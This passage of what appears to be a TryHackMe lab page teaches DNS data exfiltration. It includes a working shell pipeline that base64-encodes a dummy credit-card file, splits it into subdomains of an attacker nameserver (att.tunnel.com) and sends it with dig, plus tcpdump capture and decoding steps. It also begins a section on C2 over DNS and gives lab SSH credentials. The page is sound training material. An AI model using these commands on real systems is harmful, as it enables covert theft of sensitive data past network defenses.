<p><span>The <a class="JhJndY2H glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;JhJndY2H&#39;)">DNS</a> server must resolve the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">test.thm.com</span>&nbsp;and&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">test.tunnel.com</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">domain names to&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">127.0.0.1</span><span style="font-size:1rem">, confirming that you're ready.</span></p><p><asciinema-player src="https://asciinema.org/a/494027.cast" cols="160" rows="24"><div data-reactroot="" tabindex="-1" class="asciinema-player-wrapper hud"><div class="asciinema-player asciinema-theme-asciinema"><pre class="asciinema-terminal font-small" style="width: 160ch; height: 32em;"><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span></pre><div class="control-bar"><span class="playback-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M1,0 L11,6 L1,12 Z"></path></svg></span><span class="timer"><span class="time-elapsed">00:00</span><span class="time-remaining">-00:00</span></span><span class="fullscreen-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M12,0 L7,0 L9,2 L7,4 L8,5 L10,3 L12,5 Z"></path><path d="M0,12 L0,7 L2,9 L4,7 L5,8 L3,10 L5,12 Z"></path></svg><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M7,5 L7,0 L9,2 L11,0 L12,1 L10,3 L12,5 Z"></path><path d="M5,7 L0,7 L2,9 L0,11 L1,12 L3,10 L5,12 Z"></path></svg></span><span class="progressbar"><span class="bar"><span class="gutter"><span></span></span></span></span></div><div class="start-prompt"><div class="play-button"><div><span><svg version="1.1" viewBox="0 0 866.0254037844387 866.0254037844387" class="icon"><defs> <mask id="small-triangle-mask"> <rect width="100%" height="100%" fill="white"></rect> <polygon points="508.01270189221935 433.01270189221935, 208.0127018922194 259.8076211353316, 208.01270189221927 606.217782649107" fill="black"></polygon> </mask> </defs> <polygon points="808.0127018922194 433.01270189221935, 58.01270189221947 -1.1368683772161603e-13, 58.01270189221913 866.0254037844386" mask="url(#small-triangle-mask)" fill="white"></polygon> <polyline points="481.2177826491071 333.0127018922194, 134.80762113533166 533.0127018922194" stroke="white" stroke-width="90"></polyline></svg></span></div></div></div></div></div></asciinema-player></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Once the DNS configuration works fine, resolve the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">flag.thm.com</span>&nbsp;&nbsp;domain name. What is the IP address?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***.**.*.***" value="172.20.0.120" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-9">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse9">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 9                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Exfiltration over DNS
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse9" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>The <a class="ikzaBY2B glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;ikzaBY2B&#39;)">DNS</a> protocol is a common protocol and Its primary&nbsp;purpose is to resolve domain names to IP addresses and vice versa. Even though the DNS protocol is not designed to transfer data, threat actors found a way to abuse and move data over it.&nbsp;</span><span style="font-size:1rem"><span>This task shows a technique to exfiltrate data over the <a class="cPRkn2Hj glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;cPRkn2Hj&#39;)">DNS</a> protocol.</span></span></p><p><span style="font-size:24px"><span>What is <a class="yZh2duBw glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;yZh2duBw&#39;)">DNS</a> Data Exfiltration?</span></span></p><p><span>Since <a class="Dgq1IbgD glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;Dgq1IbgD&#39;)">DNS</a> is not a transport protocol, many organizations don't regularly monitor the DNS protocol! The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide their communications.</span><img src="./TryHackMe _ Data Exfiltration_files/8bbc858294e45de16712024af22181fc.png" alt="DNS Protocol Limitations" style="float:right" class="note-float-right"></p><p><span>The <a class="Ne3a0sEr glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;Ne3a0sEr&#39;)">DNS</a> protocol has limitations that need to be taken into consideration, which</span><span style="font-size:1rem">&nbsp;are as follows,</span></p><p></p><p></p><ul><li>The maximum length of the Fully Qualified&nbsp;<span style="font-weight:bolder">FQDN&nbsp;</span>domain name (including .separators) is&nbsp;<span style="font-weight:bolder">255&nbsp;</span>characters.</li><li>The subdomain name (label) length must not&nbsp;exceed&nbsp;<span style="font-weight:bolder">63</span>&nbsp;characters (not including .com, .net, etc).</li></ul><p><span> Based on these limitations, we can use a limited number of characters to transfer data over the domain name. If we have a large file, 10 MB for example, it may need more than 50000 <a class="7cSBgigv glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;7cSBgigv&#39;)">DNS</a> requests to transfer the file completely. Therefore, it will be noisy traffic and easy to notice and detect.</span></p><p><span style="font-size:1rem"><span>Now let's discuss the Data Exfiltration over <a class="WHly9cXb glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;WHly9cXb&#39;)">DNS</a> requirements and steps, which are as follows:</span></span><br></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/9881e420044ca01239d34c858342b888.png" alt="Data Exfiltration - Data flow" style="width:100%"><br></p><ol><li><span style="font-size:1rem">An attacker registers a domain name, for example, <b>tunnel.com</b>&nbsp;</span></li><li><span style="font-size:1rem">The attacker sets up tunnel.com's NS record points to a server that the attacker controls.</span></li><li><span style="font-size:1rem">The malware or the attacker sends sensitive data from a victim machine to a domain name they controlâ€”for example, passw0rd.tunnel.com, where <b>passw0rd </b>is the data that needs to be transferred.</span></li><li><span style="font-size:1rem"><span>The <a class="FBrcUt8o glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;FBrcUt8o&#39;)">DNS</a> request is sent through the local DNS server and is forwarded through the Internet.</span></span></li><li><span style="font-size:1rem"><span>The attacker's authoritative <a class="nJ2xS7Gx glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;nJ2xS7Gx&#39;)">DNS</a> (malicious server) receives the DNS request.</span></span></li><li><span style="font-size:1rem">Finally, the attacker extracts the password from the domain name.</span></li></ol><p><span style="font-size:24px"><span>When do we need to use the <a class="aPqMF9RA glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;aPqMF9RA&#39;)">DNS</a> Data Exfiltration?</span></span></p><p><span>There are many use case scenarios, but the typical one is when the firewall blocks and filters all traffic. We can pass data or TCP/UDP packets through a firewall using the <a class="qrX07uZg glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;qrX07uZg&#39;)">DNS</a> protocol, but it is important to ensure that the DNS is allowed and resolving domain names to IP addresses.</span><br></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/e881336d12bd5f24d2167730adda0adc.png" alt="Firewall Blocks not allowed TCP/UDP traffic" style="width:801px;height:205.194px"><br></p>
<p><span style="font-size:24px"><span>Modifying the <a class="n9zfOGwt glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;n9zfOGwt&#39;)">DNS</a> Records!</span></span></p><p><span>Now let's try to perform a <a class="oIKGMZ9I glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;oIKGMZ9I&#39;)">DNS</a> Data Exfiltration in the provided network environment. Note we will be using the </span><b>tunnel.com</b><span> domain name in this scenario. We also provide a web interface to modify the <a class="0qlqpIlg glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;0qlqpIlg&#39;)">DNS</a> records of&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tunnel.com</span>&nbsp;to insert a Name Server (NS) that points to your AttackBox machine. Ensure to complete these settings in task 8.</p><p><span style="font-size:24px"><span><a class="w5CbUvGc glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;w5CbUvGc&#39;)">DNS</a> Data Exfiltration</span></span></p><p><span>Now let's explain the manual <a class="W1cqDkP9 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;W1cqDkP9&#39;)">DNS</a> Data Exfiltration technique and show how it works. Assume that we have a</span><span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">creds.txt</span><span>&nbsp;file with sensitive data, such as credit card information. To move it over the <a class="cV3NrFmd glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;cV3NrFmd&#39;)">DNS</a> protocol, we need to encode the content of the file and attach it as a subdomain name</span><span style="font-size:1rem">&nbsp;as follows,</span><img src="./TryHackMe _ Data Exfiltration_files/a7ac15da0501d577dadcf53b4143ff98.png" alt="Encoding Technique" style="font-size:1rem;width:100%"></p><ol><li><span style="font-size:1rem">Get the required data that needs to be transferred.</span></li><li><span style="font-size:1rem">Encode the file using one of the encoding techniques.</span></li><li><span style="font-size:1rem">Send the encoded characters as subdomain/labels.</span></li><li><span>Consider the limitations of the <a class="NJbk60mN glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;NJbk60mN&#39;)">DNS</a> protocol. Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters, and each subdomain label can't exceed 63 characters. If we do exceed these limits, we split the data and send more DNS requests!</span></li></ol><p><span style="font-size:1rem"><span>Now let's try to perform the <a class="kHOv3DHR glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;kHOv3DHR&#39;)">DNS</a> Data Exfiltration technique in the provided network environment.&nbsp;</span></span><span style="font-size:1rem">This section aims to transfer the content of the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">creds.txt</span><span style="font-size:1rem">&nbsp;file from&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim2</span><span style="font-size:1rem">&nbsp;to&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">attacker</span><span style="font-size:1rem">.</span><span style="font-size:1rem">&nbsp;</span>We will use the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">att.tunnel.com</span><span style="font-size:1rem">&nbsp;</span>nameserver, pointing to the newly added machine (the attacker machine).</p><p><span style="font-weight:bolder;font-size:1rem">Important:</span><span style="font-size:1rem">&nbsp;You can use the AttackBox for this task but&nbsp;</span><span style="font-size:1rem"><span>ensure to update the <a class="zWjbHnZM glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;zWjbHnZM&#39;)">DNS</a> records and add an NS record that points to your AttackBox's IP address or use the preconfigured nameserver</span><span style="font-weight:bolder">&nbsp;att.tunnel.com</span>&nbsp;for the attacker machine.</span></p><p><span>The first thing to do is make the attacker machine ready to receive any <a class="0iUufL8B glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;0iUufL8B&#39;)">DNS</a> request. Let's connect to the attacker machine&nbsp;</span><span style="font-size:1rem">through SSH, which could be done from the Jump Box using the following credentials:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">.</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connect to the Attacker machine via SSH Client from JumpBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ ssh thm@attacker.thm.com</code>
	    </pre></div></div><p></p><p>Or from the AttackBox machine using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MACHINE_IP</span>&nbsp;and port&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">2322</span>&nbsp;as follows,</p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connect to the Attacker machine&nbsp;via SSH Client from AttackBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox$ ssh thm@MACHINE_IP -p 2322</code>
	    </pre></div></div><p></p><p><span style="font-size:1rem"><span>In order to receive any <a class="s9aVIpCJ glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;s9aVIpCJ&#39;)">DNS</a> request, we need to capture the network traffic for any incoming UDP/53 packets using the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tcpdump</span><span style="font-size:1rem">&nbsp;tool.</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Capturing <a class="j8GZbnWF glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;j8GZbnWF&#39;)">DNS</a> requests on the Attacker Machine</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v 
tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes</code>
	    </pre></div></div><p></p><p>Once the attacker machine is ready, we can move to the next step which is to<span style="font-size:1rem">&nbsp;connect to our&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim2</span><span style="font-size:1rem">&nbsp;through SSH, which could be done from the Jump Box using the following credentials:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">.</span></p>

<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connect to Victim 2 via SSH Client from JumpBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ ssh thm@victim2.thm.com</code>
	    </pre></div></div><p></p>
<p>Or from the AttackBox machine using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MACHINE_IP</span>&nbsp;and port&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">2122</span>&nbsp;as follows,</p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connect to Victim 2 via SSH Client from AttackBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox$ ssh thm@MACHINE_IP -p 2122</code>
	    </pre></div></div><p></p><p><span style="font-size:1rem">On the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim2</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">machine, there is a&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">task9/credit.txt</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">file with dummy data.</span><br></p>

<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Checking the content of the creds.txt file<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2$ cat task9/credit.txt
Name: THM-user
Address: 1234 Internet, THM
Credit Card: 1234-1234-1234-1234
Expire: 05/05/2022
Code: 1337</code>
	    </pre></div></div><p></p>
<p><span style="font-size:1rem">In order to send the content of a file, we need to convert it into a string representation which could be done using any encoding representation such as Base64, Hex, Binary, etc. In our case,&nbsp;</span><span style="font-size:1rem">we encode the file using Base64 as follows,</span><br></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Encoding the Content of the credit.txt File<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2$ cat task9/credit.txt | base64
TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==</code>
	    </pre></div></div><p></p>
<p><span>Now that we have the Base64 representation, we need to split it into one or multiple <a class="7E2ovVdG glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;7E2ovVdG&#39;)">DNS</a> requests depending on the output's length (DNS limitations) and attach it as a subdomain name. Let's show both ways starting with splitting for multiple DNS requests.</span></p><p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Splitting the content into multiple <a class="kfbPckXz glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;kfbPckXz&#39;)">DNS</a> requests</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&amp;.att.tunnel.com/' 
TmFtZTogVEhNLXVzZX.att.tunnel.com
IKQWRkcmVzczogMTIz.att.tunnel.com
NCBJbnRlcm5ldCwgVE.att.tunnel.com
hNCkNyZWRpdCBDYXJk.att.tunnel.com
OiAxMjM0LTEyMzQtMT.att.tunnel.com
IzNC0xMjM0CkV4cGly.att.tunnel.com
ZTogMDUvMDUvMjAyMg.att.tunnel.com
pDb2RlOiAxMzM3Cg==.att.tunnel.com</code>	    </pre></div></div>
<p></p>
<p>In the previous command, we read the file's content and encoded it using Base64. Then, we cleaned the string by removing the new lines and gathered every 18 characters as a group. Finally, we appended the name server "att.tunnel.com" for every group.&nbsp;</p><p><span>Let's check the other way where we send a single <a class="9Zsgmrdc glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;9Zsgmrdc&#39;)">DNS</a> request, which we will be using for our data exfiltration. This time,&nbsp;</span><span style="font-size:1rem">we split every 18 characters with a dot "." and add the name server similar to what we did in the previous command.</span></p><p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Splitting the content into a single <a class="KbZ0LUvs glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;KbZ0LUvs&#39;)">DNS</a> request</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&amp;./' | tr -d "\n" | sed s/$/att.tunnel.com/
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com</code>
	    </pre></div></div>
<p></p>
<p></p><p><span style="font-size:1rem">Next, from the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim2</span><span style="font-size:1rem"><span>&nbsp;machine, we send the base64 data as a subdomain name with considering the <a class="HL4BFDvx glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;HL4BFDvx&#39;)">DNS</a> limitation as follows:</span></span><br></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Send the Encoded data via the dig command<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&amp;./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash</code>
	    </pre></div></div><p></p>
<p><span style="font-size:1rem"><span>With some adjustments to the single <a class="mbYiw3VG glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;mbYiw3VG&#39;)">DNS</a> request, we created and added the dig command to send it over the DNS, and finally, we passed it to the bash to be executed. If we check the Attacker's tcpdump terminal, we should receive the data we sent from&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim2</span><span style="font-size:1rem">.</span><br></p>

<p></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Receiving the Data Using tcpdump<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup"><span>thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
22:14:00.287440 IP (tos 0x0, ttl 64, id 60579, offset 0, flags [none], proto UDP (17), length 104)
    172.20.0.1.56092 &gt; attacker.domain: 19543% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76)
22:14:00.288208 IP (tos 0x0, ttl 64, id 60580, offset 0, flags [none], proto UDP (17), length 235)
    172.20.0.1.36680 &gt; attacker.domain: 23460% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207)
22:14:00.289643 IP (tos 0x0, ttl 64, id 48564, offset 0, flags [DF], proto UDP (17), length 69)
    attacker.52693 &gt; 172.20.0.1.domain: 3567+ PTR? 1.0.20.172.in-addr.arpa. (41)
22:14:00.289941 IP (tos 0x0, ttl 64, id 60581, offset 0, flags [DF], proto UDP (17), length 123)
    172.20.0.1.domain &gt; attacker.52693: 3567 NXDomain* 0/1/0 (95)</span></code>
	    </pre></div></div><p></p>
<p><span>Once our <a class="l8LPwbDP glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;l8LPwbDP&#39;)">DNS</a> request is received, we can stop the tcpdump tool and clean the received data by&nbsp;</span><span style="font-size:1rem">removing unwanted strings, and finally decode</span><span style="font-size:1rem">&nbsp;back the data using Base64 as follows,</span></p>
<p></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Cleaning and Restoring the Receiving Data<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
Name: THM-user
Address: 1234 Internet, THM
Credit Card: 1234-1234-1234-1234
Expire: 05/05/2022
Code: 1337</code>
	    </pre></div></div><p></p>


<p> Nice! We have successfully transferred the content of the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">credit.txt</span><span>&nbsp;over the <a class="4Fs5tnGD glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;4Fs5tnGD&#39;)">DNS</a> protocol manually.</span></p><p><span style="font-size:24px"><span><a class="voxQvWI0 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;voxQvWI0&#39;)">C2</a> Communications over DNS</span></span></p><p><span><a class="Znf6TZY5 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;Znf6TZY5&#39;)">C2</a> frameworks use the DNS protocol for communication, such as sending a command execution request and receiving execution results over the DNS protocol. They also use the TXT DNS record to run a dropper to download extra files&nbsp;</span><span style="font-size:1rem">on a victim machine.&nbsp;</span><span style="font-size:1rem"><span>This section simulates how to execute a bash script over the <a class="xGQ4INl2 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;xGQ4INl2&#39;)">DNS</a> protocol. We will be using the web interface to add a&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 